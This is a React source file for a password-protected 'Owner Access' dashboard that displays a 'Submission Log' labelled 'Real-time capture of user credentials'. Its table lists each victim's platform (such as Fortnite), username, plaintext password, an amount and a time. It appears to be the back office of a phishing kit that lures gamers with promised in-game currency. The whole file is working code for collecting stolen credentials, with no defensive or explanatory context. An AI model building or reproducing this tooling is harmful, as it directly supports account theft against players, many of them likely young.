import { useState } from "react";
import { useSubmissions, useAdminLogin } from "@/hooks/use-submissions";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Shield, Loader2, RefreshCw, KeyRound, Monitor, User, DollarSign, Clock } from "lucide-react";
import { format } from "date-fns";
import { motion } from "framer-motion";

export default function Admin() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const loginMutation = useAdminLogin();
  const { data: submissions, isLoading, refetch } = useSubmissions();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      await loginMutation.mutateAsync(password);
      setIsAuthenticated(true);
      setError("");
    } catch (err) {
      setError("Invalid password");
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-4">
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="w-full max-w-md"
        >
          <Card className="bg-zinc-900 border-zinc-800">
            <CardHeader className="text-center pb-2">
              <div className="w-16 h-16 bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-8 h-8 text-white" />
              </div>
              <CardTitle className="text-2xl text-white">Owner Access</CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <Input
                    type="password"
                    placeholder="Enter access code"
                    className="bg-zinc-950 border-zinc-800 text-white h-12 text-center text-lg tracking-widest"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  {error && <p className="text-red-500 text-sm text-center">{error}</p>}
                </div>
                <Button 
                  type="submit" 
                  className="w-full h-12 text-base"
                  disabled={loginMutation.isPending}
                >
                  {loginMutation.isPending ? <Loader2 className="animate-spin" /> : "Unlock Dashboard"}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white p-4 md:p-8">
      <div className="max-w-7xl mx-auto space-y-8">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold flex items-center gap-3">
              <Shield className="w-8 h-8 text-primary" /> 
              Submission Log
            </h1>
            <p className="text-zinc-500 mt-1">Real-time capture of user credentials</p>
          </div>
          <Button variant="outline" onClick={() => refetch()} className="border-zinc-800 hover:bg-zinc-800 text-white">
            <RefreshCw className={`w-4 h-4 mr-2 ${isLoading ? 'animate-spin' : ''}`} /> Refresh
          </Button>
        </div>

        <Card className="bg-zinc-900 border-zinc-800 overflow-hidden">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow className="border-zinc-800 hover:bg-transparent">
                  <TableHead className="w-[100px] text-zinc-400">ID</TableHead>
                  <TableHead className="text-zinc-400"><div className="flex items-center gap-2"><Monitor className="w-4 h-4" /> Platform</div></TableHead>
                  <TableHead className="text-zinc-400"><div className="flex items-center gap-2"><User className="w-4 h-4" /> Username</div></TableHead>
                  <TableHead className="text-zinc-400"><div className="flex items-center gap-2"><KeyRound className="w-4 h-4" /> Password</div></TableHead>
                  <TableHead className="text-zinc-400"><div className="flex items-center gap-2"><DollarSign className="w-4 h-4" /> Amount</div></TableHead>
                  <TableHead className="text-right text-zinc-400"><div className="flex items-center gap-2 justify-end"><Clock className="w-4 h-4" /> Time</div></TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  <TableRow>
                    <TableCell colSpan={6} className="h-32 text-center text-zinc-500">
                      Loading data...
                    </TableCell>
                  </TableRow>
                ) : !submissions?.length ? (
                  <TableRow>
                    <TableCell colSpan={6} className="h-32 text-center text-zinc-500">
                      No submissions found yet.
                    </TableCell>
                  </TableRow>
                ) : (
                  submissions.map((item) => (
                    <TableRow key={item.id} className="border-zinc-800 hover:bg-zinc-800/50">
                      <TableCell className="font-mono text-zinc-500">#{item.id}</TableCell>
                      <TableCell>
                        <span className={`px-2 py-1 rounded text-xs font-bold uppercase tracking-wider ${
                          item.platform === 'fortnite' 
                            ? 'bg-yellow-500/10 text-yellow-500 border border-yellow-500/20' 
                            : 'bg-blue-500/10 text-blue-500 border border-blue-500/20'
                        }`}>
                          {item.platform}
                        </span>
                      </TableCell>
                      <TableCell className="font-medium text-white">{item.username}</TableCell>
                      <TableCell className="font-mono text-pink-400 bg-pink-950/20 px-2 py-1 rounded w-fit">{item.password}</TableCell>
                      <TableCell className="text-green-400 font-bold">{item.amount}</TableCell>
                      <TableCell className="text-right text-zinc-500">
                        {item.createdAt && format(new Date(item.createdAt), "MMM d, HH:mm:ss")}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </div>
    </div>
  );
}